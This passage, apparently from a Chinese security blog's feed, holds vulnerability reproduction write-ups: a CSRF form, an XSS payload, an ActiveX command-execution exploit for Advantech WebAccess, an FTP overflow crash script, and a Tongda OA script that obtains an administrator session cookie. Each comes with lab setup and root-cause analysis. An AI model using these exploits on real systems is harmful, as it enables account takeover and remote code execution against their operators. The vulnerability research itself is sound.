class="string">&quot;http://192.168.0.21/yccms_v3.4/admin/?a=admin&amp;m=update&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;admin&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;password&quot;</span> value=<span class="string">&quot;admin2&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;notpassword&quot;</span> value=<span class="string">&quot;admin2&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;send&quot;</span> value=<span class="string">&quot;ä&amp;#191;&amp;#174;æ&amp;#148;&amp;#185;å&amp;#175;&amp;#134;ç&amp;#160;&amp;#129;&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit request&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>先找到根目录下控制器文件夹C:\phpstudy_pro\WWW\yccms_v3.4\controller</p><p>可以知道admin路径对应的是AdminAction控制器</p><p><img src="https://i.loli.net/2021/04/17/soy8E1CfXVMe6hD.png" alt="yccms%20v3%204%20csrf%E6%BC%8F%E6%B4%9E%2007680c110529461f93250d4ede511790/Untitled.png"></p><p>接下来看下AdminAction.class.php，可以看到修改密码的函数 </p><p><img src="https://i.loli.net/2021/04/17/OSWRVYmHaAhl4T3.png" alt="yccms%20v3%204%20csrf%E6%BC%8F%E6%B4%9E%2007680c110529461f93250d4ede511790/Untitled%201.png"></p><p>我们在后台找到修改密码的地方进行抓包对比</p><p>a对应action,m对应method，再通过post请求发送username、password、notpassword、send这几个参数就可以发送修改密码的请求</p><p>可以看到这里并没有要求输入旧密码，因此可以生成个csrf，测试有没有csrf漏洞</p><p><img src="https://i.loli.net/2021/04/17/aMwkANo3pntsDmi.png" alt="yccms%20v3%204%20csrf%E6%BC%8F%E6%B4%9E%2007680c110529461f93250d4ede511790/Untitled%202.png"></p><p>登陆后台后，点击生成的poc文件，密码会被修改</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h2&gt;&lt;p&gt;yccms v3.4&lt;/p&gt;
&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>YCCMS V3.4存在XSS漏洞</title>
    <link href="https://tutucoo.github.io/2021/04/17/YCCMS-V3-4%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/"/>
    <id>https://tutucoo.github.io/2021/04/17/YCCMS-V3-4%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-04-17T07:50:57.000Z</published>
    <updated>2021-10-08T07:52:05.206Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>CMS下载地址: <a href="http://ahdx.down.chinaz.com/202003/yccms_v3.4.rar">http://ahdx.down.chinaz.com/202003/yccms_v3.4.rar</a></p><p>该cms根目录下有个安装文档，相关设置都在里面</p><p>有个坑，mysql需要预先创建一个my_admin数据库，否则导入会失败</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>XSS payload </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:xxx.xxx/admin/?a=html&amp;art=&lt;sCrIpT&gt;alert(1)&lt;%2FsCrIpT&gt;&amp;m=arts</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/17/IX9kiWuKaR7UhOt.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled.png"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>点击“开始生成”，界面上更新文字，“内容生成完毕！共6条”，猜测这里执行了js代码</p><p><img src="https://i.loli.net/2021/04/17/iqPEA6yZOLR5H1S.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%201.png"></p><p>抓包，a参数对应根目录下的控制器，m参数表示方法，art参数是生成文章的数量 </p><p><img src="https://i.loli.net/2021/04/17/UDIZdazr6fViFO1.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%202.png"></p><p>art的参数赋值为<script>alert(1)</script>直接弹窗了</p><p>我们再看下源码，找到html控制器</p><p><img src="https://i.loli.net/2021/04/17/Qk1eJbdn38w7Phm.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%203.png"></p><p>找到arts函数，可以看到生成完成后会使用document.body.innerHTML写入到网页中，从而执行了js代码，</p><p><img src="https://i.loli.net/2021/04/17/6xSJHE9O1rjXw4a.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%204.png"></p><p>前端插入xss后的源码</p><p><img src="https://i.loli.net/2021/04/17/eHMOXcfTE29F8Qs.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%205.png"></p><p>继续看“内容生成完毕”所在的位置，可以看到在art被赋值为一段js代码后，最终得到了执行</p><p><img src="https://i.loli.net/2021/04/17/kP7bG25BvYgiV6H.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%206.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;p&gt;CMS下载地址: &lt;a href=&quot;http://ahdx.down.chinaz.com/202003/yccms_v3.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-6911 Advantech WebAccess远程任意命令执行复现分析</title>
    <link href="https://tutucoo.github.io/2021/02/06/CVE-2018-6911-Advantech-WebAccess%E8%BF%9C%E7%A8%8B%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://tutucoo.github.io/2021/02/06/CVE-2018-6911-Advantech-WebAccess%E8%BF%9C%E7%A8%8B%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</id>
    <published>2021-02-06T09:25:48.000Z</published>
    <updated>2021-10-08T07:52:05.206Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Advantech Webaccess Node目录下的AspVBObj.dll文件中存在VBWinExec方法，该方法允许攻击者通过命令参数执行任意系统命令</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>1.Windows 7 </p><p>2.Advantech WebAccess 8.2</p><p>3.IE 9</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p> 安装Advantech WebAccess 8.2</p><p>由于该漏洞是利用com组件，因此只要存在AspVBObj.dll文件即可完成EXP，安装完毕后，将EXP另存为html文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Advantech WebAccess Node8.3.0 &quot;AspVBObj.dll&quot; - Remote Code Execution&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;object id&#x3D;rce classid&#x3D;&quot;clsid:&#123;55F52D11-CEA5-4D6C-9912-2C8FA03275CE&#125;&quot;&gt;&lt;&#x2F;object&gt;</span><br><span class="line">    &lt;SCRIPT&gt;  </span><br><span class="line">        function exploit() &#123; </span><br><span class="line">            rce.VBWinExec(&quot;calc&quot;) </span><br><span class="line">        &#125;  </span><br><span class="line">    &lt;&#x2F;SCRIPT&gt; </span><br><span class="line">    &lt;input language&#x3D;JavaScript onclick&#x3D;exploit() type&#x3D;button value&#x3D;&quot;Exploit-Me&quot;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure><p>打开IE选项-安全-自定义级别</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl3erp1j30d607wt9i.jpg" alt="img"></p><p>设置“对未标记为可安全执行脚本的ActiveX控件初始化并执行”为启用</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl3xkx6j30es02qjrn.jpg" alt="img"></p><p> 在Windows7上访问服务器的EXP网页，执行exp</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl05u9sj30gm06qq36.jpg" alt="img"></p><p>命令顺利执行</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl4bvulj30c60dygnn.jpg" alt="img"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在html的object元素中定义clsid，可以用于Windows上的com组件的引用，clsid是该dll的统一唯一标识符，Windows中的com组件就是通过clsid来进行引用的。</p><p>根据它的clsid：{55F52D11-CEA5-4D6C-9912-2C8FA03275CE}在注册表中进行搜索</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl0mqggj30i007i74r.jpg" alt="img"></p><p>可以找到它的键值，AspVBObj</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl120kuj30rg0h0acu.jpg" alt="img"></p><p>可以猜测这是它的一个dll文件，在C:\WebAccess\Node目录下找到AspVBObj.dll，拖进IDA进行逆向分析，打开字符串小窗口看到一个VBWinExec函数</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdkznvuej30ya0b2413.jpg" alt="img"></p><p>根据经验可以判断这个很可能是个命令执行的函数，根据poc，可以看到这个命令执行的函数使用方法是直接传递字符串calc实现了弹出系统自带计算器</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经测试在Advantech WebAccess 8.2版本中也存在该漏洞，可以成功执行EXP，基于该漏洞的类型，影响的版本可能比较广泛。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;Advantech Webaccess Node目录下的AspVBObj.dll文件中存在VBWinExec方法，该方法允许</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PCMan FTP Server 2.0.7远程缓冲区溢出</title>
    <link href="https://tutucoo.github.io/2021/01/21/PCMan-FTP-Server-2-0-7%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <id>https://tutucoo.github.io/2021/01/21/PCMan-FTP-Server-2-0-7%E8%BF%9C%E7%A8%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</id>
    <published>2021-01-21T02:54:25.000Z</published>
    <updated>2021-10-08T07:52:05.206Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PCMan-FTP-Server-2-0-7远程缓冲区溢出"><a href="#PCMan-FTP-Server-2-0-7远程缓冲区溢出" class="headerlink" title="PCMan FTP Server 2.0.7远程缓冲区溢出"></a>PCMan FTP Server 2.0.7远程缓冲区溢出</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>pcman：进入这个地址下载<a href="https://www.exploit-db.com/exploits/26471">https://www.exploit-db.com/exploits/26471/</a></p><p>python 2.7.0</p><p>windows 7 64位 专业版</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动PCMan后，执行poc，PCMan崩溃</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.3.163&quot;,21))</span><br><span class="line">s.recv(1024)</span><br><span class="line">User &#x3D; &#39;anonymous&#39;</span><br><span class="line">Password &#x3D; &#39;A&#39;*8000</span><br><span class="line">s.send(&quot;USER&quot; + User + &quot;\r\n&quot;)</span><br><span class="line">print s.recv(1024)</span><br><span class="line">s.send(&quot;PASS&quot; + Password + &quot;\r\n&quot;)</span><br><span class="line">print s.recv(1024)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/NgP7Hx8bhBYK3a6-20210121105455985.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>用Windbg挂载pcman之后，执行poc，Windbg会断下，可以看到eip的值是41414141，产生了缓冲区溢出</p><p>poc中调用了send函数，pcman很可能是通过recv来接收数据的，在IDA中查看recv函数调用的情况，可以看到有两处调用</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/1730632840271.png"></p><p>在Windbg中这两处函数调用下断点，然后执行poc</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/2828561526913.png"></p><p>程序在recv处会断下四次，第四次断下后再执行程序就会产生崩溃，所以需要在第三次断下之后单步进行调试，单步执行完402a26(调用sub_403e60)时程序崩溃，所以需要进入这个函数，接下来通过这种方式一步步靠近最终导致崩溃的函数</p><p>第四次在402a26处断下时，dd esp查看堆栈情况<br>可以看到函数返回地址是402a2b，此时返回地址还是正常的，函数执行完会跳到这个地址继续执行指令<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/2725184152125.png"></p><p>看一下402a2b的地址，正是sub_403e60的下一条指令</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/47561302131.png"></p><p>继续执行到403ee6处，也就是_sprintf函数的位置，在还没有执行_sprintf函数时，dd 18ed68查看堆栈，可以看到函数返回地址仍然是402a2b，执行完_sprintf函数，可以看到函数返回地址已经被冲刷成41414141了，这会造成函数在返回时跳转到41414141接着执行，而41414141是一个非法的地址，程序因此会崩溃，可能是由于_sprintf函数在执行时没有控制源字符串的大小，导致过长的字符串冲刷掉了函数返回地址</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/431792199120.png"></p><p>我们可以通过观察sprintf函数执行前后内存变化来印证这一点<br>_sprintf函数的第一个参数是目地缓冲区，用于保存拼接的字符串，这个参数保存在寄存器ecx中<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/5428838106174.png"></p><p>查看ecx的地址18E568，这里保存了sprintf函数的10个参数，可以看到第10个参数是超长的字符串<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/5049600201308.png"></p><p>对应ida里面的a2参数，a2就是传进来的超长字符串<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/3229776791168.png"></p><p>执行完sprintf函数之后，函数返回地址被冲刷了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/5632851706756.png"></p><p>再接着往下执行，单步到ret 4处，ret 4等同于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add esp 4</span><br><span class="line">jmp 返回地址</span><br></pre></td></tr></table></figure><p>此时返回地址已经被冲刷为41414141了，所以jmp 到返回地址时，程序崩溃</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/2544833597577.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这个漏洞的复现，我们可以反推漏洞挖掘的过程</p><p>通过wireshark抓包（ftp数据包需要选择正确的本地以太网卡，否则ftp数据抓包不全）</p><p>可以看到发送一个正常的ftp请求，服务器首先会返回欢迎字样</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/5917157208251.png"></p><p>然后要求输入用户名和密码</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/2613873151628.png"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/4500148821404.png"></p><p>对比poc就可以知道为啥poc要这么发了，可以知道在挖掘这个漏洞时，先是通过正常ftp请求，抓包分析，然后通过python脚本模拟请求，成功后再进行fuzz，最后在password后面接上超长字符串，程序崩溃，再通过windbg和ida回溯产生崩溃的函数，最终定位到sprintf函数产生了溢出。</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/3881747756168.png"></p><p>简单的分析到此结束，谢谢观看～～</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PCMan-FTP-Server-2-0-7远程缓冲区溢出&quot;&gt;&lt;a href=&quot;#PCMan-FTP-Server-2-0-7远程缓冲区溢出&quot; class=&quot;headerlink&quot; title=&quot;PCMan FTP Server 2.0.7远程缓冲区溢出&quot;&gt;&lt;/a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>通达 OA Office Anywhere v11.4任意用户登录漏洞复现与原理详细解析（第二处）</title>
    <link href="https://tutucoo.github.io/2020/12/19/%E9%80%9A%E8%BE%BE%20OA%20Office%20Anywhere%20v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%EF%BC%88%E7%AC%AC%E4%BA%8C%E5%A4%84%EF%BC%89/"/>
    <id>https://tutucoo.github.io/2020/12/19/%E9%80%9A%E8%BE%BE%20OA%20Office%20Anywhere%20v11.4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90%EF%BC%88%E7%AC%AC%E4%BA%8C%E5%A4%84%EF%BC%89/</id>
    <published>2020-12-18T16:00:00.000Z</published>
    <updated>2021-10-08T07:52:05.208Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。 Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的 Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密码验证与登录验证机制更加强了系统安全性。</p><p>通达OA官方更新了V11版本安全补丁，修复了任意用户伪造登录漏洞，该漏洞的操作难度低，危害程度大。未经授权的攻击者通过构造请求包实现用户登录，又由于UID是主键且步进为1递增，从而导致可以指定UID实现任意用户登录（admin的缺省UID为1）。</p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>官网：<a href="https://www.tongda2000.com/">https://www.tongda2000.com/</a></p><p>下载：<a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe">https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe</a></p><p>版本：通达OA V11.X&lt;V11.5</p><p>测试系统： </p><p>Windows 7 专业版 64位操作系统 </p><p>macOS11.0.1 （攻击机）</p><p>python3.7.5</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>第一步：访问ispirit/login_code.php，在返回值中保存codeuid：{58AA7BF5-725C-F8EB-3324-BE17C4E8F6AA}</p><p>第二步：访问general/login_code_scan.php<br>修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET请求改为POST请求</span><br><span class="line">添加Content-Type</span><br><span class="line">添加Content-Length</span><br><span class="line">添加请求体codeuid&#x3D;&#123;xxx&#125;&amp;source&#x3D;pc&amp;uid&#x3D;1&amp;type&#x3D;confirm&amp;username&#x3D;admin</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219101708128_5207.png"></p><p>这个请求一般会返回status 1</p><p>  <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219102012280_28610.png"></p><p>  第三步：访问/ispirit/login_code_check.php?codeuid={xxx}</p><p>  <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219102123533_12814.png"></p><p>  如果请求正常，会返回如下图所示数据<br>  <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219102401024_13617.png"></p><p>第四步：访问/general/index.php，顺利登录后台，权限是系统管理员，实现任意用户登录<br>  <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219102509925_13991.png"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞地址存在于general/login_code_scan.php，进入解密后的源码处查看代码，可以看到通过POST请求接收5个参数，然后存到数组里，uid可控，没有对uid进行任何校验，这就产生了漏洞<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219104350520_5847.png"></p><p>这里会检测codeuid，如果codeuid存在并且正确会返回1</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219104600278_30979.png"></p><p>再后面就没有任何检测了，直接在返回包里返回status</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219105133157_30970.png"></p><p>漏洞点要发送5个参数，分别是codeuid，source，uid，type，username</p><ul><li><p>codeuid必须是实时获取到的，否则无法通过校验</p></li><li><p>source只需填入pc、web或者mac其中之一（源码中做了判断,必须是这三个之一才会正常返回status）</p></li><li><p>uid为1就是管理员权限，可以通过本地数据库查到，前面几篇博客都说明了，就不多说了。</p></li><li><p>最后并没有对type和username做检测</p></li></ul><p>按理发请求的时候这两个任意值都是可以的，但是经过测试username可以是任意值，但是type必须是confirm，否则无法任意用户登录，那么这个type应该是有校验的，只不过不是在这个文件中，所以我们要找到这个校验处。<br>  校验很可能存在的位置就是下一个步骤，也就是访问/ispirit/login_code_check.php?codeuid={xxx}，找到源码进行查看。<br>可以看到15行对type进行判断</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219170612652_23176.png"></p><p>如果type不是confirm就不会执行session操作，换句话就无法保存状态，伪造的管理员cookie也就无法生效了，后续直接访问后台就不会成功，所以type必须是confirm。</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201219170917295_8923.png"></p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>找到v11.5版本的general/login_code_scan.php文件，可以看到不再直接从UID参数中取UID了，而是通过P参数获取sessionid，再通过sessionid获取数据库中的UID，再通过UID等信息生成TOKEN，最后再通过TOKEN等信息生成缓存，这样就解决了UID可控的问题了</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/image-20201219215830050.png" alt="image-20201219215830050"></p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/image-20201219221115596.png" alt="image-20201219221115596"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞点存在于general/login_code_scan.php，需要传递5个参数，分别是codeuid、source、uid、type、username、其中codeuid需要发送ispirit/login_code.php请求获取，其他几个参数通过分析源码我们也都知道了，唯独还有/ispirit/login_code_check.php?codeuid={xxx}请求，不知道是从何而来，可能是通过黑盒测试，二维码扫描过程中抓到的吧，也就是个猜测，自己通过APP扫码登录出了点问题，就不再细说了。</p><h2 id="附：POC"><a href="#附：POC" class="headerlink" title="附：POC"></a>附：POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def getSession(url):</span><br><span class="line">    vulUrl &#x3D; url+&#39;&#x2F;ispirit&#x2F;login_code.php&#39;</span><br><span class="line">    res &#x3D; requests.get(vulUrl)</span><br><span class="line">    codeuid &#x3D; json.loads(res.text)[&#39;codeuid&#39;]</span><br><span class="line">    print(codeuid)</span><br><span class="line">    confirmUrl &#x3D; url + &#39;&#x2F;general&#x2F;login_code_scan.php&#39;</span><br><span class="line">    data &#x3D; &#123;</span><br><span class="line">        &#39;codeuid&#39;:codeuid,</span><br><span class="line">        &#39;uid&#39;: int(1),</span><br><span class="line">        &#39;source&#39;: &#39;pc&#39;,</span><br><span class="line">        &#39;type&#39;: &#39;confirm&#39;,</span><br><span class="line">        &#39;username&#39;: &#39;admin&#39;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res &#x3D; requests.post(confirmUrl,data&#x3D;data)</span><br><span class="line">    status &#x3D; json.loads(res.text)[&#39;status&#39;]</span><br><span class="line">    print(status)</span><br><span class="line">    if status &#x3D;&#x3D; str(1):</span><br><span class="line">        seesionUrl &#x3D; url + &#39;&#x2F;ispirit&#x2F;login_code_check.php?codeuid&#x3D;&#39;+codeuid</span><br><span class="line">        res &#x3D; requests.get(seesionUrl)</span><br><span class="line">        print(&#39;[*]cookie:&#39;+res.headers[&#39;Set-Cookie&#39;])</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;[-]failed&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    getSession(&#39;http:&#x2F;&#x2F;xxxx&#x2F;&#39;)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。 Office Anywhere采用基于W</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>通达 OA Office Anywhere 2017任意用户登录漏洞复现与原理详细解析</title>
    <link href="https://tutucoo.github.io/2020/12/18/%E9%80%9A%E8%BE%BE%20OA%20Office%20Anywhere%202017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/"/>
    <id>https://tutucoo.github.io/2020/12/18/%E9%80%9A%E8%BE%BE%20OA%20Office%20Anywhere%202017%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%8E%9F%E7%90%86%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/</id>
    <published>2020-12-18T03:58:29.000Z</published>
    <updated>2021-10-08T07:52:05.208Z</updated>
    
